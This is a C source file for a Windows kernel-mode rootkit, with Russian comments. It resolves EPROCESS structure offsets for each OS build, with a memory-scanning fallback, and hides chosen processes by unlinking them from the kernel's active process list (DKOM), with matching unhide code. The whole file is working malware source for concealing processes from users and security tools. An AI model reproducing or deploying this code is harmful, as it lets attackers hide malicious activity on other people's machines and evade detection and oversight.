#include "rootkit.h"

// таблица известных офсетов по build number
typedef struct _BUILD_OFFSETS {
    ULONG BuildMin;
    ULONG BuildMax;
    ULONG UniqueProcessId;
    ULONG ActiveProcessLinks;
    ULONG ImageFileName;
} BUILD_OFFSETS;

static const BUILD_OFFSETS g_BuildTable[] = {
    // Win10 1809
    { 17763, 17763, 0x2E8, 0x2F0, 0x450 },
    // Win10 1903 – Win11 22H2 (22621)
    { 18362, 22621, 0x440, 0x448, 0x5A8 },
    // Win11 23H2 (22631) – 24H2 (26100)
    { 22631, 26199, 0x440, 0x448, 0x5A8 },
    // Win11 26H1+ (26200+) — пока те же, но проверяем сканером
    { 26200, 0xFFFFFFFF, 0x440, 0x448, 0x5A8 },
};

// динамическое разрешение офсетов
NTSTATUS ResolveOffsets() {
    RTL_OSVERSIONINFOW ver = { sizeof(ver) };
    RtlGetVersion(&ver);
    ULONG build = ver.dwBuildNumber;

    // ищем в таблице
    BOOLEAN found = FALSE;
    for (ULONG i = 0; i < sizeof(g_BuildTable)/sizeof(g_BuildTable[0]); i++) {
        if (build >= g_BuildTable[i].BuildMin && build <= g_BuildTable[i].BuildMax) {
            g_Offsets.UniqueProcessId    = g_BuildTable[i].UniqueProcessId;
            g_Offsets.ActiveProcessLinks = g_BuildTable[i].ActiveProcessLinks;
            g_Offsets.ImageFileName      = g_BuildTable[i].ImageFileName;
            found = TRUE;
            break;
        }
    }
    if (!found) {
        // самый свежий неизвестный билд — берём последнюю запись как стартовую точку
        g_Offsets.UniqueProcessId    = 0x440;
        g_Offsets.ActiveProcessLinks = 0x448;
        g_Offsets.ImageFileName      = 0x5A8;
    }

    // верификация + fallback сканер — всегда проверяем
    PEPROCESS system = PsInitialSystemProcess;
    if (!system) return STATUS_UNSUCCESSFUL;

    ULONG_PTR pid = *(PULONG_PTR)((PUCHAR)system + g_Offsets.UniqueProcessId);
    if (pid != 4) {
        // сканируем широкий диапазон — ищем PID == 4 (System)
        BOOLEAN resolved = FALSE;
        for (ULONG off = 0x200; off < 0x800; off += 8) {
            ULONG_PTR val = *(PULONG_PTR)((PUCHAR)system + off);
            if (val != 4) continue;

            // дополнительная верификация: ActiveProcessLinks[off+8] должен быть
            // валидным LIST_ENTRY (Flink указывает куда-то в kernel)
            PLIST_ENTRY flink = *(PLIST_ENTRY*)((PUCHAR)system + off + 8);
            if (!MmIsAddressValid(flink)) continue;

            g_Offsets.UniqueProcessId    = off;
            g_Offsets.ActiveProcessLinks = off + 8;
            // ImageFileName идёт на фиксированной дельте от UniqueProcessId
            // верифицируем: для System процесса ImageFileName = "System\0"
            // пробуем несколько известных дельт
            ULONG imgDeltas[] = { 0x168, 0x170, 0x178, 0x180 };
            for (ULONG d = 0; d < 4; d++) {
                PUCHAR name = (PUCHAR)system + off + imgDeltas[d];
                if (name[0] == 'S' && name[1] == 'y' && name[2] == 's' &&
                    name[3] == 't' && name[4] == 'e' && name[5] == 'm') {
                    g_Offsets.ImageFileName = off + imgDeltas[d];
                    break;
                }
            }
            resolved = TRUE;
            break;
        }
        if (!resolved) return STATUS_NOT_FOUND;
    }

    return STATUS_SUCCESS;
}

// получить EPROCESS по PID
static PEPROCESS LookupProcess(ULONG Pid) {
    PEPROCESS process = NULL;
    if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)Pid, &process)))
        return NULL;
    ObDereferenceObject(process);
    return process;
}

NTSTATUS HideProcess(ULONG Pid) {
    PEPROCESS target = LookupProcess(Pid);
    if (!target) return STATUS_NOT_FOUND;

    PHIDDEN_PROCESS_ENTRY entry = (PHIDDEN_PROCESS_ENTRY)
        ExAllocatePoolWithTag(NonPagedPool, sizeof(HIDDEN_PROCESS_ENTRY), 'ktoR');
    if (!entry) return STATUS_INSUFFICIENT_RESOURCES;

    PLIST_ENTRY listEntry = (PLIST_ENTRY)((PUCHAR)target + g_Offsets.ActiveProcessLinks);

    KIRQL irql;
    KeAcquireSpinLock(&g_HiddenProcessLock, &irql);

    // сохраняем соседей для последующего восстановления
    entry->ProcessId  = Pid;
    entry->PrevFlink  = listEntry->Flink;
    entry->NextBlink  = listEntry->Blink;

    // DKOM unlink — вырезаем из двусвязного списка
    listEntry->Blink->Flink = listEntry->Flink;
    listEntry->Flink->Blink = listEntry->Blink;

    // зацикливаем на себя чтобы не краши при обходе внутри process
    listEntry->Flink = listEntry;
    listEntry->Blink = listEntry;

    InsertTailList(&g_HiddenProcessList, &entry->ListEntry);

    KeReleaseSpinLock(&g_HiddenProcessLock, irql);
    return STATUS_SUCCESS;
}

NTSTATUS UnhideProcess(ULONG Pid) {
    KIRQL irql;
    KeAcquireSpinLock(&g_HiddenProcessLock, &irql);

    PLIST_ENTRY cur = g_HiddenProcessList.Flink;
    while (cur != &g_HiddenProcessList) {
        PHIDDEN_PROCESS_ENTRY entry = CONTAINING_RECORD(cur, HIDDEN_PROCESS_ENTRY, ListEntry);
        if (entry->ProcessId == Pid) {
            PEPROCESS target = LookupProcess(Pid);
            if (target) {
                PLIST_ENTRY listEntry = (PLIST_ENTRY)((PUCHAR)target + g_Offsets.ActiveProcessLinks);

                // восстанавливаем
                listEntry->Flink = entry->PrevFlink;
                listEntry->Blink = entry->NextBlink;
                entry->NextBlink->Flink = listEntry;
                entry->PrevFlink->Blink = listEntry;
            }

            RemoveEntryList(cur);
            ExFreePoolWithTag(entry, 'ktoR');
            KeReleaseSpinLock(&g_HiddenProcessLock, irql);
            return STATUS_SUCCESS;
        }
        cur = cur->Flink;
    }

    KeReleaseSpinLock(&g_HiddenProcessLock, irql);
    return STATUS_NOT_FOUND;
}
